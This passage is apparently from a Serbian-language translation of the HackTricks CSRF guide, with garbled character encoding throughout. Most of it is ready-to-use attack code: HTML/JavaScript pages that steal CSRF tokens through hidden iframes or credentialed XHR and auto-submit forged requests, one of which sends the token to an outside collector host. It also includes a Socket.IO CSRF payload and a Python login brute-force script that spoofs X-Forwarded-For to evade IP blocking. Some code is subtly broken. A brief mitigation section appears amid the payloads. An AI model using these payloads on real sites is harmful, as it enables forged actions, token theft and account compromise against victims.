1. Kreirajte HTML formu koja Ä‡e simulirati akciju na ciljanoj veb stranici.
2. UkljuÄite CSRF token u formu.
3. Automatski podnesite formu koristeÄ‡i JavaScript.

#### **Ajax metoda**

1. Koristite JavaScript da izvrÅ¡ite Ajax zahtev na ciljanoj veb stranici.
2. UkljuÄite CSRF token u zahtev.
3. PoÅ¡aljite POST zahtev koristeÄ‡i ukradeni CSRF token.

Napomena: Ove metode su ilegalne i koriste se samo u edukativne svrhe ili sa pristankom vlasnika veb stranice.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Ukradi CSRF token i poÅ¡alji POST zahtev koristeÄ‡i iframe i formu**

Da biste izvrÅ¡ili CSRF napad, prvo morate da ukradete CSRF token sa ciljane veb stranice. Jedan od naÄina da to uradite je koriÅ¡Ä‡enjem iframe-a i forme.

1. Napravite iframe koji Ä‡e uÄitati ciljanu veb stranicu:

```html
<iframe id="targetFrame" src="https://www.ciljanavebstranica.com"></iframe>
```

2. Koristite JavaScript da biste pristupili iframe-u i izvukli CSRF token:

```html
<script>
  var targetFrame = document.getElementById('targetFrame');
  var csrfToken = targetFrame.contentWindow.document.querySelector('input[name="csrf_token"]').value;
</script>
```

3. Kreirajte formu koja Ä‡e sadrÅ¾ati ukradeni CSRF token i ciljane podatke za POST zahtev:

```html
<form id="csrfForm" action="https://www.ciljanavebstranica.com/post" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <input type="hidden" name="data" value="ciljanipodaci">
</form>
```

4. Koristite JavaScript da biste postavili ukradeni CSRF token u formu i automatski je podneli:

```html
<script>
  var csrfForm = document.getElementById('csrfForm');
  csrfForm.querySelector('input[name="csrf_token"]').value = csrfToken;
  csrfForm.submit();
</script>
```

Kada Å¾rtva poseti veb stranicu koja sadrÅ¾i ovaj kod, iframe Ä‡e uÄitati ciljanu veb stranicu i izvuÄ‡i CSRF token. Zatim Ä‡e se automatski popuniti forma sa ukradenim tokenom i ciljanim podacima, i podneti POST zahtev na ciljanu veb stranicu. Na taj naÄin, napadaÄ moÅ¾e izvrÅ¡iti zlonamerne radnje u ime Å¾rtve.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Ukradi token i poÅ¡alji ga koristeÄ‡i 2 iframe-a**

Da biste izvrÅ¡ili CSRF napad, prvo morate ukrasti CSRF token sa ciljane veb stranice. Zatim, koristite dva iframe-a da biste poslali ukradeni token na drugu veb stranicu.

1. Napravite prvi iframe koji Ä‡e prikazivati ciljanu veb stranicu. Ovaj iframe Ä‡e automatski uÄitati ciljanu veb stranicu i dobiti CSRF token.

```html
<iframe src="https://www.ciljanavebstranica.com" id="iframe1"></iframe>
```

2. Koristite JavaScript da biste pristupili CSRF tokenu u prvom iframe-u i saÄuvali ga u promenljivoj.

```html
<script>
  var iframe1 = document.getElementById('iframe1');
  var token = iframe1.contentWindow.document.getElementsByName('csrf_token')[0].value;
</script>
```

3. Napravite drugi iframe koji Ä‡e poslati ukradeni token na drugu veb stranicu.

```html
<iframe src="https://www.drugavebstranica.com/csrf-attack" id="iframe2"></iframe>
```

4. Koristite JavaScript da biste postavili ukradeni token u drugom iframe-u.

```html
<script>
  var iframe2 = document.getElementById('iframe2');
  iframe2.contentWindow.document.getElementsByName('csrf_token')[0].value = token;
  iframe2.contentWindow.document.forms[0].submit();
</script>
```

Kada Å¾rtva poseti veb stranicu koja sadrÅ¾i ove iframe-e, njen CSRF token Ä‡e biti ukraden i poslat na drugu veb stranicu. Ovo omoguÄ‡ava napadaÄu da izvrÅ¡i neovlaÅ¡tene radnje u ime Å¾rtve.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTUkradi CSRF token pomoÄ‡u Ajax-a i poÅ¡alji post zahtev sa formom**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF sa Socket.IO

CSRF (Cross-Site Request Forgery) napad je vrsta napada koji se koristi za izvrÅ¡avanje neovlaÅ¡Ä‡enih radnji u ime korisnika na veb aplikacijama. Kada se koristi Socket.IO, koji je biblioteka za realno vreme, moguÄ‡e je izvrÅ¡iti CSRF napad na veb aplikaciju koja koristi ovu biblioteku.

Da biste izvrÅ¡ili CSRF napad sa Socket.IO, potrebno je da napadaÄ ubaci zlonamerni kod u legitimnu veb stranicu koju korisnik poseÄ‡uje. Ovaj zlonamerni kod Ä‡e zatim iskoristiti Socket.IO biblioteku da bi poslao zahtev na ciljanu veb aplikaciju, izvrÅ¡avajuÄ‡i tako neovlaÅ¡tene radnje u ime korisnika.

Da biste se zaÅ¡titili od CSRF napada sa Socket.IO, moÅ¾ete primeniti sledeÄ‡e mere:

1. Implementirajte CSRF zaÅ¡titu na serveru: Ovo ukljuÄuje generisanje i proveru CSRF tokena za svaki zahtev koji dolazi sa Socket.IO konekcijom. Na taj naÄin se osigurava da samo legitimni zahtevi budu prihvaÄ‡eni.

2. Koristite SameSite atribut za kolaÄiÄ‡e: Postavljanje SameSite atributa na "Strict" ili "Lax" za kolaÄiÄ‡e koji se koriste sa Socket.IO moÅ¾e spreÄiti CSRF napade. Ovaj atribut ograniÄava slanje kolaÄiÄ‡a samo na isti sajt ili na sajtove koji su deo istog domena.

3. Upotrebite CSRF zaÅ¡titu na klijentskoj strani: Implementirajte CSRF token na klijentskoj strani i proverite ga pre slanja zahteva putem Socket.IO. Ovo Ä‡e dodatno oteÅ¾ati napadaÄima da izvrÅ¡e CSRF napad.

Primenom ovih mera, moÅ¾ete smanjiti rizik od CSRF napada sa Socket.IO i osigurati bezbednost vaÅ¡e veb aplikacije.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Brute Force napad na prijavljivanje

Kod se moÅ¾e koristiti za Brute Force napad na formu za prijavljivanje koristeÄ‡i CSRF token (TakoÄ‘e koristi zaglavlje X-Forwarded-For kako bi pokuÅ¡ao zaobiÄ‡i moguÄ‡e blokiranje IP adrese):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Alati <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Reference

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
